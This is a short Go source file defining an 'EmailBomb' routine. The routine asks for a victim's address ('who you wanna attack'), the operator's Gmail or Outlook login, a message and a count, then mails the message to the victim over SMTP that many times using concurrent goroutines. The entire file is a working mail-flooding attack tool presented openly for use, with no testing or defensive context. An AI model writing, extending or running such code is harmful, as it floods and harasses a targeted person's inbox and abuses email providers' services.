package core

import (
	"fmt"
	"net/smtp"
	"strings"
	"sync"
	"time"
)

func sendEmail(
	email, password, smtpServer, bombEmail, message string,
	wg *sync.WaitGroup,
	ch chan<- int,
) {
	defer wg.Done()

	auth := smtp.PlainAuth("", email, password, smtpServer)
	err := smtp.SendMail(smtpServer+":587", auth, email, []string{bombEmail}, []byte(message))
	if err != nil {
		fmt.Println("[ERROR]:", err)
		ch <- 0
		return
	}

	ch <- 1
}

func EmailBomb() {
	var bombEmail, email, password, message, serviceProvider string
	var counter int

	fmt.Print("enter email address who you wanna attack: ")
	fmt.Scan(&bombEmail)
	fmt.Print("enter your gmail or outlook address: ")
	fmt.Scan(&email)
	fmt.Print("enter your gmail or outlook password: ")
	fmt.Scan(&password)
	fmt.Print("enter message: ")
	fmt.Scan(&message)
	fmt.Print("how many messages you wanna send?: ")
	fmt.Scan(&counter)

	fmt.Print("select the service provider (Gmail / Outlook): ")
	fmt.Scan(&serviceProvider)
	serviceProvider = strings.ToLower(serviceProvider)

	var smtpServer string
	if serviceProvider == "gmail" {
		smtpServer = "smtp.gmail.com"
	} else if serviceProvider == "outlook" {
		smtpServer = "smtp.office365.com"
	}

	var wg sync.WaitGroup
	ch := make(chan int, counter)

	for x := 0; x < counter; x++ {
		wg.Add(1)
		go sendEmail(email, password, smtpServer, bombEmail, message, &wg, ch)
		time.Sleep(1 * time.Second)
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	successCount := 0
	errorCount := 0

	for result := range ch {
		if result == 1 {
			successCount++
		} else {
			errorCount++
		}
	}

	fmt.Printf("total emails sent: %d\n", successCount)
	fmt.Printf("total errors: %d\n", errorCount)
}
